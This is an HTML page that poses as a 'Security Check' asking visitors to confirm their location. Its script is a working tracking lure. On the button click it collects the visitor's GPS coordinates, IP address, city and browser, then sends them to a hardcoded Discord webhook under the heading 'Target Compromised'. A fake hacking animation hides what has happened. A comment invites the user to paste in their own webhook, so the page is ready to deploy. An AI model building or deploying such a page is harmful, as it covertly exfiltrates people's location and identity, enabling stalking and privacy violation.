<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Security Verification</title> 
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; font-family: 'Segoe UI', sans-serif; background: #000; }
        #nature-screen {
            width: 100%; height: 100%;
            background: url('https://i.ibb.co/FkV6vY0/image-b0e308.png') no-repeat center center fixed;
            background-size: cover;
            display: flex; align-items: center; justify-content: center;
        }
        #verify-box {
            background: rgba(255, 255, 255, 0.98);
            padding: 40px; border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            text-align: center; width: 85%; max-width: 380px;
        }
        #start-btn { 
            background: #28a745; color: white; border: none; 
            padding: 15px 30px; font-size: 1.1rem; border-radius: 8px;
            cursor: pointer; font-weight: bold; width: 100%;
        }
        #hacker-screen {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #000; display: none; align-items: center; justify-content: center;
        }
        #hacker-box {
            width: 90%; max-width: 600px; border: 2px solid #00FF41; padding: 30px;
            background: rgba(0, 10, 0, 0.9); box-shadow: 0 0 20px #00FF41;
            color: #00FF41; font-family: 'Courier New', monospace;
        }
        h1 { color: #ff0000; font-size: 1.2rem; text-shadow: 0 0 5px red; margin-top: 0; }
        #progress-container { width: 100%; border: 1px solid #00FF41; height: 45px; margin-top: 25px; position: relative; overflow: hidden; }
        #progress-bar { width: 0%; height: 100%; background: #00FF41; }
        .percent-text { position: absolute; width: 100%; top: 12px; text-align: center; font-weight: bold; font-size: 1.2rem; z-index: 5; }
    </style>
</head>
<body>

    <div id="nature-screen">
        <div id="verify-box">
            <div style="font-size: 50px;">🛡️</div>
            <h2>Security Check</h2>
            <p>Verification required. Please confirm your location to continue.</p>
            <button id="start-btn" onclick="startHack()">[ VERIFY IDENTITY ]</button>
        </div>
    </div>

    <div id="hacker-screen">
        <div id="hacker-box">
            <h1>> [ BYPASS_PROTOCOL_ACTIVE ]</h1>
            <div id="log-content"></div>
            <div id="progress-container">
                <div id="percent-text" class="percent-text">0%</div>
                <div id="progress-bar"></div>
            </div>
        </div>
    </div>

    <script>
        // ⚠️ PASTE YOUR WEBHOOK URL INSIDE THE QUOTES BELOW
        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1487870677636612197/G4uFH8d-UVi14OSGeAjy198ahM_va3PC32KjFV9l4aRV3rphNPRYR71l3Tr_3FAFhYBr"; 

        async function startHack() {
            // Switch Screens
            document.getElementById('nature-screen').style.display = 'none';
            document.getElementById('hacker-screen').style.display = 'flex';

            // Trigger GPS and Webhook
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => sendWebhook(pos.coords.latitude, pos.coords.longitude),
                    () => sendWebhook("DENIED", "DENIED")
                );
            } else {
                sendWebhook("NOT_SUPPORTED", "NOT_SUPPORTED");
            }
            
            runAnimation();
        }

        async function sendWebhook(lat, lon) {
            try {
                const ipRes = await fetch('https://ipapi.co/json/');
                const ipData = await ipRes.json();

                const mapsUrl = lat !== "DENIED" && lat !== "NOT_SUPPORTED" 
                    ? `https://www.google.com/maps?q=${lat},${lon}` 
                    : "Location Access Denied";

                const payload = {
                    username: "Mody12_S Exploit",
                    embeds: [{
                        title: "🎯 Target Compromised",
                        color: 65280, // Green
                        fields: [
                            { name: "🌐 IP Address", value: `\`${ipData.ip}\``, inline: true },
                            { name: "📍 City", value: `${ipData.city}, ${ipData.region}`, inline: true },
                            { name: "🎯 GPS Lock", value: mapsUrl },
                            { name: "📱 Browser", value: navigator.userAgent.split(') ')[0] + ')' }
                        ],
                        footer: { text: "Protocol v10.5 Active" },
                        timestamp: new Date()
                    }]
                };

                await fetch(DISCORD_WEBHOOK, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                });
            } catch (err) { console.error("Webhook Error:", err); }
        }

        function runAnimation() {
            let currentPct = 0;
            const pb = document.getElementById('progress-bar');
            const pt = document.getElementById('percent-text');
            const log = document.getElementById('log-content');
            const lines = ["INITIALIZING...", "IP_FOUND...", "GPS_SYNCING...", "WIPING_LOGS..."];

            const interval = setInterval(() => {
                if (currentPct < 100) {
                    currentPct++;
                    pb.style.width = currentPct + '%';
                    pt.innerText = currentPct + '%';
                    if (currentPct % 25 === 0) {
                        log.innerHTML += `<div>> ${lines[currentPct/25 - 1]}</div>`;
                    }
                } else {
                    clearInterval(interval);
                    setTimeout(() => {
                        document.body.innerHTML = "<h1 style='color:red; text-align:center; margin-top:20%; font-family:monospace;'>SYSTEM_PURGE_COMPLETE</h1>";
                    }, 1000);
                }
            }, 60);
        }
    </script>
</body>
</html>
